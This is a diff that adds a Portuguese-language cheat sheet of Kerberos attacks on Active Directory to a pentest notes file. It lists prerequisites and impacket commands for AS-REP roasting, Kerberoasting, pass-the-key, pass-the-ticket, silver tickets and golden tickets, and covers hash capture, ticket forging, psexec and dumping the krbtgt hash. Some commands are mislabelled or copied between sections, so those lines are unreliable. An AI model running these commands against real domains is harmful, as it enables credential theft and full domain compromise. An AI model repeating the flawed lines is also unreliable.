@@ -8724,6 +8724,44 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 	firefox -CreateProfile "prj_x" /File_Name/Firefox-Profile
 	firefox -P prj_x
 
+Tipos de ataques ao KERBEROS
+
+AS-REP Roasting 
+PRECISA DA LISTA DE USUARIO - NAO ESTAR HABILITADO O PREAUTH - ACERTAR os HORARIOS - ADD HOSTNAME AO HOSTS 
+	
+ 	sudo net time set -S IP-DC
+ 	impacket-GetNPUsers brasil.floripa.local/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast - SALVA HASHES DO TIPO krbtg5 e -m 18200 
+
+
+Kerberoasting
+PRECISA TER UMA CREDENCIAL VALIDA PARA FAZER ESSE TIPO DE ATAQUE
+
+	impacket-GetNPUsers -request -dc-ip 192.168.2.37 brasil.floripa.local/maori:'PasW0rd432#_TheHardPassword:)' -outputfile file-HASHES-para-quebrar
+
+Pass the Key
+PRECISA TER A SECRET KEY DO USER ATRAVEZ DO MIMIKATZ ou DCSYNC, MAS É NECESSARIO PRIVILEGIOS
+Pass the Ticket
+PRECISA TER ACESSO AO SERVIDOR QUE TENHA O TICKET VALIDO EM CACHE
+
+ 	getTGT.py -aesKey 'kerberosKey' $domain/$user@target
+	export KRB5CCNAME=/tmp/ticket.ccache
+	impacket-psexec -k -no-pass -dc-ip DC-IP
+
+Silver Ticket
+PRECISA DO NT HASH do Serviço, DOMAIN SID, SPN
+
+	ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
+	export KRB5CCNAME='/Path/fake_user.ccache'
+	psexec.py -k HOST.floripa.local
+
+
+Golden Ticket
+PRECISA DO NT HASH do KRBTGT (HASH MAIS IMPOSTANTE DO AD)
+
+	ticketer.py -nthash HASE-NT-HERE -domain-sid SID-DOMAIN-HERE -domain floripa.local -spn SPN/HERE.floripa.local fake_user
+	export KRB5CCNAME='/Path/fake_user.ccache'
+ 	secretsdump.py -k dc01.floripa.local -just-dc-ntlm -just-dc-user krbtgt
+
 TO BE CONTINUED
 .
 .
